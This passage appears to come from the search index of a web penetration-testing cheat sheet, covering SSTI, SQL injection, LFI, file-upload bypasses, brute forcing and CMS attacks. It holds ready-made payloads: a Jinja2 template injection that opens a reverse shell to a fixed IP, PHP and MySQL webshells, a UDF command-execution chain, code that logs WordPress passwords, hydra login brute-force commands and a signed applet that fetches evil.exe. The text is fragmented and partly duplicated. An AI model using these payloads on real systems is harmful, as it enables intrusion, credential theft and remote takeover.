os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\ /bin/bash\\ ]); )}}{ % endif % }{ % endfor % } Client Side Attacks XSS Impact: https://somdev.me/21-things-xss/ Tools https://github.com/s0md3v/XSStrike Payloads http://htmlpurifier.org/live/smoketests/xssAttacks.xml http://heideri.ch/jso/#46 Fetch an external resource: https://github.com/aurainfosec/xss_payloads/blob/master/fetch.md Advance XSS Persistence With Oauth: https://github.com/dxa4481/XSSOauthPersistence https://blog.secureideas.com/2018/12/twelve-days-of-xssmas.html XSS Cheat Sheet: https://brutelogic.com.br/blog/xss-cheat-sheet/ http://www.xss-payloads.com/payloads.html XSS via Image XSS via HTTP Response Splitting XSS via Cookie XSS via AngularJS Template Injection Applet javac Java.java echo \u201cPermissions: all-\u00ad\u2010permissions\u201d /root/manifest.txt jar cvf Java.jar Java.class added manifest adding: Java.class ( in = 1233 ) ( out = 709 )( deflated 42 % ) keytool -\u00ad\u2010genkey -\u00ad\u2010alias signapplet -\u00ad\u2010keystore mykeystore -\u00ad\u2010keypass mykeypass -\u00ad\u2010storepass password123 jarsigner -\u00ad\u2010keystore mykeystore -\u00ad\u2010storepass password123 -\u00ad\u2010keypass mykeypass -\u00ad\u2010signedjar SignedJava.jar Java.jar signapplet echo applet width= 1 height= 1 id= Java Secure code= Java.class archive= SignedJava.jar param name= 1 value= http://192.168.10.5:80/evil.exe /applet /var/www/java.html Other Browser extensions: LinkedIn browser plugin enumeration: https://github.com/dandrews/nefarious-linkedin Browser, VMEscape and Kernel Exploitation (Chrome/Safari): https://github.com/vngkv123/aSiagaming Other Practical HTTP Host header attacks: https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html Multiple Ways to Exploiting PUT Method - https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/ Scenarios Techniques Discovery and Enumeration httprobe - Take a list of domains and probe for working HTTP and HTTPS servers https://github.com/tomnomnom/httprobe cat domains . txt | httprobe | tee alive . txt cat domains . txt | httprobe - p http : 8080 - p https : 4443 | tee alive . txt VHost VHostScan: https://github.com/codingo/VHostScan Subdomains wfuzz -u https:// ( TARGET DOMAIN NAME ) -w /infosec/wordlists/SecLists/Discovery/DNS/subdomains-list-5000.txt -H Host: FUZZ.(TARGET DOMAIN NAME) Files and Folders Gobuster: https://github.com/OJ/gobuster #!/bin/bash set -eu URL = $1 echo super go bustering for super brute: $URL gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/tomcat.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/nginx.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/apache.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/ApacheTomcat.fuzz.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/sharepoint.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/iis.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x txt,php,html,htm DirBuster: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project EroDir: A fast web directory/file enumeration tool written in Rust: https://github.com/PinkP4nther/EroDir DeepSearch: https://github.com/m4ll0k/DeepSearch Filebuster - An extremely fast and flexible web fuzzer: https://github.com/henshin/filebuster Interesting files pyHAWK: Searches the directory of choice for interesting files. Such as database files and files with passwords stored on them: https://github.com/MetaChar/pyHAWK Hidden directories and files as a source of sensitive information about web application: https://medium.com/@_bl4de/hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application-84e5c534e5ad Parameters WFuzz - Identity parameter names: wfuzz - c - z file , burp - parameter - names . txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup Word-lists https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.tx Technologies used: WhatWeb - recognises web technologies ( versions): https://github.com/urbanadventurer/WhatWeb Site Mapping https://code.google.com/archive/p/skipfish/ WAF Bypasses Web Application Firewall (WAF) Evasion Techniques: https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 Web Application Firewall (WAF) Evasion Techniques #2: https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0 Web Application Firewall (WAF) Evasion Techniques #3: https://www.secjuice.com/web-application-firewall-waf-evasion/ SSL /TLS Attacks sslyze - Fast and powerful SSL/TLS server scanning library. testssl.sh - Checks any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws Build a valid SSL certificate chain (or fix an incomplete chain): https://github.com/trimstray/mkchain Brute-forcing W3brute - Automatic Web Application Brute Force Attack Tool: https://github.com/aprilahijriyan/w3brute POST hydra -l ( USERNAME ) -P /path/to/wordlist.txt ( TARGET IP ADDRESS ) \\ http-post-form /URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^ (HTML FORM PASSWORD ATTRIBUTE)=^PASS^ Login=Login:(FAILED LOGIN MESSAGE) GET hydra -l admin -P /pwnt/passwords/wordlists/rockyou.txt ( TARGET IP ADDRESS ) \\ http-get-form /login.php:username=^USER^ password=^PASS^ Login=Login:Please Login|Bad Request Fuzzing Cookies wfuzz -z \\ file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt \\ -b passwd = FUZZ http:// ( TARGET IP ADDRESS ) : ( TARGET PORT ) Defense Awesome-WAF - A curated list of awesome web-app firewall (WAF) stuff: https://github.com/0xInfection/Awesome-WAF CMS Drupal Username Enumeration https://raw.githubusercontent.com/weaknetlabs/Penetration-Testing-Grimoire/master/Brute%20Force/Tools/drupalUserEnum.py Password Brute-forcing curl -s http://drupal.site/user/ | grep form_build_id | cut -d \\ -f 6 hydra -l admin -P /wordlists/rockyou.txt ( TARGET DRUPAL IP ) \\ http-form-post /?q=user/:name=admin pass=^PASS^ form_id=user_login form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry PHP Code Execution** Enable\u200b PHP Filter\u200b module on the \u200b Modules\u200b Add content\u200b then to \u200b Article Pasting PHP into the article body Changing the \u200b Text format\u200b to \u200bPHP code\u200b Clicking on \u200b Preview\u200b Tools Droopescan - https://github.com/droope/droopescan Wordpress Version discovery** curl -s 192 .168.56.102/wordpress/ | grep generator curl -s 192 .168.56.102/wordpress/readme.html | grep Version curl -s 192 .168.56.102/wordpress/wp-login.php | grep ver= User enumeration for i in $( seq 1 5 ) ; do curl -sL 192 .168.110.105/wordpress/?author = $i | grep title ; done // When stop-user-enumeration plugin installed curl -i -sL 192.168.56.102/wordpress/?wp-comments-post author=1 | grep title curl -sL 192 .168.56.102/wordpress/?wp-comments-post -d author = 1 | grep title // Rest API ( 4 .7+ ) curl -s http://localhost/wp-json/wp/v2/users Theme and plugin enumeration** /wordpress_site/wp-content/plugins/ /wordpress_site/wp-content/themes/ wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/CMS/wp_plugins.fuzz.txt --hc 404 192 .168.56.104/wordpress/FUZZ nmap -sV -p 80 192 .168.56.102 --script = http-wordpress-enum.nse --script-args = http-wordpress-enum.root = /wordpress/ Enumerate users, plugins and themes wpscan - u http : // 192 . 168 . 110 . 105 / wordpress / - e u , ap , at Password Brute-forcing echo admin users . txt echo wpuser users . txt hydra - L users . txt - P lists / 500 . txt - e nsr 192 . 168 . 110 . 105 http - post - form /wordpress/wp-login.php:log=^USER^ pwd=^PASS^ wp-submit=Log+In testcookie=1:S=Location wpscan --users users.txt -w /root/lists/500.txt -u 192.168.110.105/wordpress/ Privilege escalations searchsploit wordpress escalation Log passwords from wp-login.php file_put_contents ( creds.txt , $ _POST [ log ]. - . $ _POST [ pwd ]) Obtain shell Editing the main header.php script of the WordPress site to contain a reverse shell. Uploading a fake plugin containing a reverse shell. Uploading a fake theme containing a reverse shell. http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip nc - lvp 31337 curl 192 . 168 . 56 . 102 / wordpress / wp - content / themes / fake - theme / header . php Tools WPScan - https://github.com/wpscanteam/wpscan Droopescan - https://github.com/droope/droopescan wpBullet - Static code analysis for WordPress Plugins/Themes Joomla Tools Droopescan - https://github.com/droope/droopescan Moodle Tools Droopescan - https://github.com/droope/droopescan SilverStripe Tools Droopescan - https://github.com/droope/droopescan Sharepoint Important files: / _layouts / viewlsts . aspx \u200b Tools BurpSuite Burp Suite Pro Real-life tips tricks: https://www.agarri.fr/docs/HiP2k13-Burp_Pro_Tips_and_Tricks.pdf Extensions Extensions: https://github.com/snoopysecurity/awesome-burp-extensions Turbo Intruder: https://github.com/PortSwigger/turbo-intruder ADAPT is a tool that performs automated Penetration Testing for WebApps https://github.com/secdec/adapt * OTG - IDENT - 004 \u2013 Account Enumeration * OTG - AUTHN - 001 - Testing for Credentials Transported over an Encrypted Channel * OTG - AUTHN - 002 \u2013 Default Credentials * OTG - AUTHN - 003 - Testing for Weak lock out mechanism * OTG - AUTHZ - 001 \u2013 Directory Traversal * OTG - CONFIG - 002 - Test Application Platform Configuration * OTG - CONFIG - 006 \u2013 Test HTTP Methods * OTG - CRYPST - 001 - Testing for Weak SSL / TLS Ciphers , Insufficient Transport Layer Protection * OTG - CRYPST - 002 - Testing for Padding Oracle * OTG - ERR - 001 - Testing for Error Code * OTG - ERR - 002 \u2013 Testing for Stack Traces * OTG - INFO - 002 \u2013 Fingerprinting the Webserver * OTG - INPVAL - 001 - Testing for Reflected Cross site scripting * OTG - INPVAL - 002 - Testing for Stored Cross site scripting * OTG - INPVAL - 003 \u2013 HTTP Verb Tampering * OTG - SESS - 001 - Testing for Session Management Schema * OTG - SESS - 002 \u2013 Cookie Attributes Hawkeye - Project security, vulnerability and general risk highlighting tool: https://github.com/hawkeyesec/scanner-cli Adobe Experience Manager (AEM) hacker toolset: https://github.com/0ang3el/aem-hacker Practice https://www.owasp.org/index.php/OWASP_Hacking_Lab http://www.dvwa.co.uk/ http://www.itsecgames.com/ Damn Vulnerable Serverless Application: https://www.owasp.org/index.php/OWASP_DVSA https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA Login, registration, change password, change email, confirmation of email update Pending References Breaking Parser Logic!: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf A Fresh Look On Reverse Proxy Related Attacks: https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/","title":"Web"},{"location":"web/#vulnerabilities","text":"","title":"Vulnerabilities"},{"location":"web/#command-injection","text":"Bypass w \\ h \\ o \\ a \\ m \\ i \\ w \\ h \\ o \\ a \\ m \\ i html , htm , js , jsb , mhtml , mht , ** php , phtml , php3 , php4 , php5 , phps , ** shtml , jhtml , pl , py , cgi , sh , ksh , bsh , c , htaccess , htpasswd , exe , scr , dll , msi , vbs , bat , com , pif , cmd , vxd , cpl , empty Tools Commix - https://github.com/commixproject/commix Usage examples: https://github.com/commixproject/commix/wiki/Usage-Examples","title":"Command Injection"},{"location":"web/#crlf","text":"https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies?slide=28 Tools CRLF-Injection-Scanner: https://github.com/MichaelStott/CRLF-Injection-Scanner/blob/master/crlf_scan.py CRLF - Auto CRLF Injector: https://github.com/rudSarkar/crlf-injector Payloads https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt https://github.com/mubix/tools/blob/master/fuzzdb/attack-payloads/http-protocol/crlf-injection.fuzz.txt","title":"CRLF"},{"location":"web/#csrf","text":"Methodology: https://twitter.com/Alra3ees/status/1076021203117195265 CSRF Cheatsheet: https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/ Tools XSRFProbe: https://github.com/0xInfection/XSRFProbe","title":"CSRF"},{"location":"web/#file-upload","text":"Bypass Null Byte: %00 to bypass file name restrictions ( wpes . php % 00 . png ) Suffix file name with % ( example . php % ) Double Extensions: wpes . png . php valid . txt . php Altering content type Magic number: (Example: gif: GIF89a ; ) Put GIF89a ; \u200b as the first line in the file and save the file with a \u200b .gif \u200b extension https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/ Code in image comment: exiftool - Comment = ?php echo pre ; system ( $_GET [ cmd ]); ? lo . jpg Alternative Extensions PHP - pht, phpt, phtml, php3, php4, php5, php6, php7 CFM - cfml, cfc, dbm ASP - aspx Perl - pl, pm, cgi, lib JSP - jspx, jsw, jsv, jspf","title":"File Upload"},{"location":"web/#open-redirect","text":"Scenarios Grab tokens via mis-configured apps/login flows Bypassing blacklists for SSRF/RCE XSS via \"location.href = 'javascript:alert(0)1'\" Taking advantage of fileuploads and mobile devices Bypasses https % 3 A % 2 F % 2 Fmysite . com % 2 F https % 3 A % 2 F % 2 Fexample . com % 2 F % 3 Freturnurl % 3 D % 2 F % 2 Fmysite . com % 2 F \\ / yoururl . com \\ / \\ / yoururl . com \\\\ yoururl . com // yoururl . com // theirsite @ yoursite . com https : // yoursite ? c = . theirsite . com / https : // yoursite . com #. theirsite . com / https : // yoursite . com \\. thersite . com / //% 2 F / yoursite . com //// yoursite . com https : // theirsite . computer / - ( if they just check for * theirsite . com * , . computer is a valid tld ! https : // theirsite . com . mysite . com - ( Treat their domain as subdomain to yours ) /% 0 D / yoursite . com - ( Also try % 09 , % 00 , % 0 a , % 07 ) java % 0 d % 0 ascript % 0 d % 0 a : alert ( 0 ) , j % 0 d % 0 aava % 0 d % 0 aas % 0 d % 0 acrip % 0 d % 0 at % 0 d % 0 a : confirm ` 0 ` , java % 07 script : prompt ` 0 ` , java % 09 scrip % 07 t : prompt ` 0 ` https://www.bugbountynotes.com/training/tutorial?id=1","title":"Open Redirect"},{"location":"web/#ssrf","text":"SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-2: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-3: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739 Tools https://github.com/swisskyrepo/SSRFmap","title":"SSRF"},{"location":"web/#sql-injection","text":"https://www.websec.ca/kb/sql_injection#Extra_About https://docs.google.com/document/d/1z2ozmSfUtT_3RBUM_1FFpTEYj7yKoGBpPlASz_iShsg/edit https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ Tools SqlMap: sqlmap - r sqlmap . req --level=5 --risk=3 --dump-all\u200b AutoSQLi: https://github.com/jesuiscamille/AutoSQLi SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/ Automatic SQL injection with Charles and sqlmap api http://0r1.me/SQLiScanner/ https://github.com/0xbug/SQLiScanner Payload Combines blind command injection and blind sql injection (mysql) in one payload (works with no quotes/single quotes and double quotes): https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065 /*$(sleep 5)`sleep 5``*/ sleep ( 5 ) # /*$(sleep 5)`sleep 5` #*/||sleep(5)|| ||sleep(5)|| ` WebShell over MySQL: SELECT ?php echo shell_exec ( $_GET [ c ]); ? INTO OUTFILE /var/www/html/example.php User Defined Functions (UDF) (sqlmap/udf/mysql) SELECT @@ plugin_dir ; PowerShell$ Convert - Dll - DllPath lib_mysqludf_sys . dll - OutputPath bytes . txt SELECT CHAR ( 64 , 64 ,....) INTO OUTFILE @@plugin_dir /lib_mysqludf_sys.dll FIELDS ESCAPED BY ; CREATE FUNCTION sys_eval RETURNS STRING SONAME lib_mysqludf_sys.dll ; SELECT sys_eval ( whoami ); Simple payloads: or 1=1 LIMIT 1 -- or 1 = 1 LIMIT 1 -- - or 1=1 LIMIT 1# or 1 # or 1=1 -- or 1 = 1 -- - Order by to get column count: 1337 order by N Read file: LOAD_FILE ( /etc/passwd ) Read from information schema: union select 1 , 2 , group_concat ( distinct table_schema separator , ) from information_schema . tables LIMIT 1 , 1 union select 1 , 2 , group_concat ( distinct table_name separator , ) from information_schema . tables where table_schema = security LIMIT 1 , 1 Write to file: select 1 , 2 , 3 , 4 , ?php echo system ( $_GET [ cmd ]); ? , 6 INTO OUTFILE C:\\htdocs\\webroot\\shell.php SQL Server Run Responder and do following to capture hashes: EXEC ( master .. xp_dirtree ( \\\\ (ATTACKER IP ADDRESS)\\foo ) -- Add a trigger to do a malicious action (price 0) Language Specific PHP Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/ ) Practice https://github.com/Audi-1/sqli-labs","title":"SQL Injection"},{"location":"web/#lfi-rfi","text":"Universal LFI for Windows + PHP (using phpinfo): https://rdot.org/forum/showthread.php?t=1134 PHP LFI to arbitrary code execution via rfc1867 file upload temporary files Payloads including uploaded files include data:// or php://input, php://filter pseudo protocol including logs including /proc/self/environ include session files - (usually names /tmp/sess_SESSIONID) include other files created by PHP application C :\\ Windows \\ Temp \\ php 16 - bit - random . TMP without bruteforce can do inc = C : \\ Windows \\ Temp \\ php LFI to RCE RCE with TXT upload Expose .txt file and use a vulnerable include to include the txt file into code (evil.txt.php). PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include) RCE with Logs Use NC to write logs with malicious content to access_logs. Connect and just send the attack string (In user-agent etc.). Then include the log file (local file inclusion) RCE over SQLi Return ?php echo \"test\"? from SQL and see results to check if RCE is possible over SQLi PHP Wrappers File upload with POST data curl - s -- data ? system ( ls -la ); ? http://target.host/web.php?file_path=php://input%00 Base64 encode the LFI http : // X . X . X . X /? page = php : // filter / convert . base64 - encode / resource = ( PHP FILE NAME NO EXTENSION )","title":"LFI / RFI"},{"location":"web/#path-traversal","text":"Payloads .. / .. \\ .. \\ / % 2 e % 2 e % 2f % 252 e % 252 e % 252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 %uff0e%uff0e%u2216 ... / . / ... \\ . \\","title":"Path Traversal"},{"location":"web/#server-side-template-injection-ssti","text":"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection Introduction and Bypasses: https://bowneconsultingcontent.com/pub/EH/proj/ED105.htm https://portswigger.net/research/server-side-template-injection Diff Template related: Server-Side Template Injection: RCE for the modern webapp: https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf Payloads: Jinja2 { % for x in (). __class__ . __base__ . __subclasses__ () % }{ % if warning in x . __name__ % }{{ x (). _module . __builtins__ [ __import__ ]}}{ % endif % }{ % endfor % } { % for x in (). __class__ . __base__ . __subclasses__ () % }{ % if warning in x . __name__ % }{{ x (). _module . __builtins__ [ __import__ ]( os ). popen ( python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\ 1 92.90.172.2\\ ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\ /bin/bash\\ ]); )}}{ % endif % }{ % endfor % }","title":"Server Side Template Injection (SSTI)"},{"location":"web/#client-side-attacks","text":"","title":"Client Side Attacks"},{"location":"web/#xss","text":"Impact: https://somdev.me/21-things-xss/ Tools https://github.com/s0md3v/XSStrike Payloads http://htmlpurifier.org/live/smoketests/xssAttacks.xml http://heideri.ch/jso/#46 Fetch an external resource: https://github.com/aurainfosec/xss_payloads/blob/master/fetch.md Advance XSS Persistence With Oauth: https://github.com/dxa4481/XSSOauthPersistence https://blog.secureideas.com/2018/12/twelve-days-of-xssmas.html XSS Cheat Sheet: https://brutelogic.com.br/blog/xss-cheat-sheet/ http://www.xss-payloads.com/payloads.html XSS via Image XSS via HTTP Response Splitting XSS via Cookie XSS via AngularJS Template Injection","title":"XSS"},{"location":"web/#applet","text":"javac Java.java echo \u201cPermissions: all-\u00ad\u2010permissions\u201d /root/manifest.txt jar cvf Java.jar Java.class added manifest adding: Java.class ( in = 1233 ) ( out = 709 )( deflated 42 % ) keytool -\u00ad\u2010genkey -\u00ad\u2010alias signapplet -\u00ad\u2010keystore mykeystore -\u00ad\u2010keypass mykeypass -\u00ad\u2010storepass password123 jarsigner -\u00ad\u2010keystore mykeystore -\u00ad\u2010storepass password123 -\u00ad\u2010keypass mykeypass -\u00ad\u2010signedjar SignedJava.jar Java.jar signapplet echo applet width= 1 height= 1 id= Java Secure code= Java.class archive= SignedJava.jar param name= 1 value= http://192.168.10.5:80/evil.exe /applet /var/www/java.html","title":"Applet"},{"location":"web/#other","text":"Browser extensions: LinkedIn browser plugin enumeration: https://github.com/dandrews/nefarious-linkedin Browser, VMEscape and Kernel Exploitation (Chrome/Safari): https://github.com/vngkv123/aSiagaming","title":"Other"},{"location":"web/#other_1","text":"Practical HTTP Host header attacks: https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html Multiple Ways to Exploiting PUT Method - https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/","title":"Other"},{"location":"web/#scenarios","text":"","title":"Scenarios"},{"location":"web/#techniques","text":"","title":"Techniques"},{"location":"web/#discovery-and-enumeration","text":"httprobe - Take a list of domains and probe for working HTTP and HTTPS servers https://github.com/tomnomnom/httprobe cat domains . txt | httprobe | tee alive . txt cat domains . txt | httprobe - p http : 8080 - p https : 4443 | tee alive . txt VHost VHostScan: https://github.com/codingo/VHostScan Subdomains wfuzz -u https:// ( TARGET DOMAIN NAME ) -w /infosec/wordlists/SecLists/Discovery/DNS/subdomains-list-5000.txt -H Host: FUZZ.(TARGET DOMAIN NAME) Files and Folders Gobuster: https://github.com/OJ/gobuster #!/bin/bash set -eu URL = $1 echo super go bustering for super brute: $URL gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/tomcat.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/nginx.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/apache.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/ApacheTomcat.fuzz.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/sharepoint.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/iis.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x txt,php,html,htm DirBuster: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project EroDir: A fast web directory/file enumeration tool written in Rust: https://github.com/PinkP4nther/EroDir DeepSearch: https://github.com/m4ll0k/DeepSearch Filebuster - An extremely fast and flexible web fuzzer: https://github.com/henshin/filebuster Interesting files pyHAWK: Searches the directory of choice for interesting files. Such as database files and files with passwords stored on them: https://github.com/MetaChar/pyHAWK Hidden directories and files as a source of sensitive information about web application: https://medium.com/@_bl4de/hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application-84e5c534e5ad Parameters WFuzz - Identity parameter names: wfuzz - c - z file , burp - parameter - names . txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup Word-lists https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.tx Technologies used: WhatWeb - recognises web technologies ( versions): https://github.com/urbanadventurer/WhatWeb Site Mapping https://code.google.com/archive/p/skipfish/","title":"Discovery and Enumeration"},{"location":"web/#waf-bypasses","text":"Web Application Firewall (WAF) Evasion Techniques: https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 Web Application Firewall (WAF) Evasion Techniques #2: https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0 Web Application Firewall (WAF) Evasion Techniques #3: https://www.secjuice.com/web-application-firewall-waf-evasion/","title":"WAF Bypasses"},{"location":"web/#ssl-tls-attacks","text":"sslyze - Fast and powerful SSL/TLS server scanning library. testssl.sh - Checks any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws Build a valid SSL certificate chain (or fix an incomplete chain): https://github.com/trimstray/mkchain","title":"SSL /TLS Attacks"},{"location":"web/#brute-forcing","text":"W3brute - Automatic Web Application Brute Force Attack Tool: https://github.com/aprilahijriyan/w3brute POST hydra -l ( USERNAME ) -P /path/to/wordlist.txt ( TARGET IP ADDRESS ) \\ http-post-form /URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^ (HTML FORM PASSWORD ATTRIBUTE)=^PASS^ Login=Login:(FAILED LOGIN MESSAGE) GET hydra -l admin -P /pwnt/passwords/wordlists/rockyou.txt ( TARGET IP ADDRESS ) \\ http-get-form /login.php:username=^USER^ password=^PASS^ Login=Login:Please Login|Bad Request","title":"Brute-forcing"},{"location":"web/#fuzzing","text":"Cookies wfuzz -z \\ file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt \\ -b passwd = FUZZ http:// ( TARGET IP ADDRESS ) : ( TARGET PORT )","title":"Fuzzing"},{"location":"web/#defense","text":"Awesome-WAF - A curated list of awesome web-app firewall (WAF) stuff: https://github.com/0xInfection/Awesome-WAF","title":"Defense"},{"location":"web/#cms","text":"","title":"CMS"},{"location":"web/#drupal","text":"Username Enumeration https://raw.githubusercontent.com/weaknetlabs/Penetration-Testing-Grimoire/master/Brute%20Force/Tools/drupalUserEnum.py Password Brute-forcing curl -s http://drupal.site/user/ | grep form_build_id | cut -d \\ -f 6 hydra -l admin -P /wordlists/rockyou.txt ( TARGET DRUPAL IP ) \\ http-form-post /?q=user/:name=admin pass=^PASS^ form_id=user_login form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry PHP Code Execution** Enable\u200b PHP Filter\u200b module on the \u200b Modules\u200b Add content\u200b then to \u200b Article Pasting PHP into the article body Changing the \u200b Text format\u200b to \u200bPHP code\u200b Clicking on \u200b Preview\u200b Tools Droopescan - https://github.com/droope/droopescan","title":"Drupal"},{"location":"web/#wordpress","text":"Version discovery** curl -s 192 .168.56.102/wordpress/ | grep generator curl -s 192 .168.56.102/wordpress/readme.html | grep Version curl -s 192 .168.56.102/wordpress/wp-login.php | grep ver= User enumeration for i in $( seq 1 5 ) ; do curl -sL 192 .168.110.105/wordpress/?author = $i | grep title ; done // When stop-user-enumeration plugin installed curl -i -sL 192.168.56.102/wordpress/?wp-comments-post author=1 | grep title curl -sL 192 .168.56.102/wordpress/?wp-comments-post -d author = 1 | grep title // Rest API ( 4 .7+ ) curl -s http://localhost/wp-json/wp/v2/users Theme and plugin enumeration** /wordpress_site/wp-content/plugins/ /wordpress_site/wp-content/themes/ wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/CMS/wp_plugins.fuzz.txt --hc 404 192 .168.56.104/wordpress/FUZZ nmap -sV -p 80 192 .168.56.102 --script = http-wordpress-enum.nse --script-args = http-wordpress-enum.root = /wordpress/ Enumerate users, plugins and themes wpscan - u http : // 192 . 168 . 110 . 105 / wordpress / - e u , ap , at Password Brute-forcing echo admin users . txt echo wpuser users . txt hydra - L users . txt - P lists / 500 . txt - e nsr 192 . 168 . 110 . 105 http - post - form /wordpress/wp-login.php:log=^USER^ pwd=^PASS^ wp-submit=Log+In testcookie=1:S=Location wpscan --users users.txt -w /root/lists/500.txt -u 192.168.110.105/wordpress/ Privilege escalations searchsploit wordpress escalation Log passwords from wp-login.php file_put_contents ( creds.txt , $ _POST [ log ]. - . $ _POST [ pwd ]) Obtain shell Editing the main header.php script of the WordPress site to contain a reverse shell. Uploading a fake plugin containing a reverse shell. Uploading a fake theme containing a reverse shell. http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip nc - lvp 31337 curl 192 . 168 . 56 . 102 / wordpress / wp - content / themes / fake - theme / header . php Tools WPScan - https://github.com/wpscanteam/wpscan Droopescan - https://github.com/droope/droopescan wpBullet - Static code analysis for WordPress Plugins/Themes","title":"Wordpress"},{"location":"web/#joomla","text":"Tools Droopescan - https://github.com/droope/droopescan","title":"Joomla"},{"location":"web/#moodle","text":"Tools Droopescan - https://github.com/droope/droopescan","title":"Moodle"},{"location":"web/#silverstripe","text":"Tools Droopescan - https://github.com/droope/droopescan","title":"SilverStripe"},{"location":"web/#sharepoint","text":"Important files: / _layouts / viewlsts . aspx \u200b","title":"Sharepoint"},{"location":"web/#tools","text":"BurpSuite Burp Suite Pro Real-life tips tricks: https://www.agarri.fr/docs/HiP2k13-Burp_Pro_Tips_and_Tricks.pdf Extensions Extensions: https://github.com/snoopysecurity/awesome-burp-extensions Turbo Intruder: https://github.com/PortSwigger/turbo-intruder ADAPT is a tool that performs automated Penetration Testing for WebApps https://github.com/secdec/adapt * OTG - IDENT - 004 \u2013 Account Enumeration * OTG - AUTHN - 001 - Testing for Credentials Transported over an Encrypted Channel * OTG - AUTHN - 002 \u2013 Default Credentials * OTG - AUTHN - 003 - Testing for Weak lock out mechanism * OTG - AUTHZ - 001 \u2013 Directory Traversal * OTG - CONFIG - 002 - Test Application Platform Configuration * OTG - CONFIG 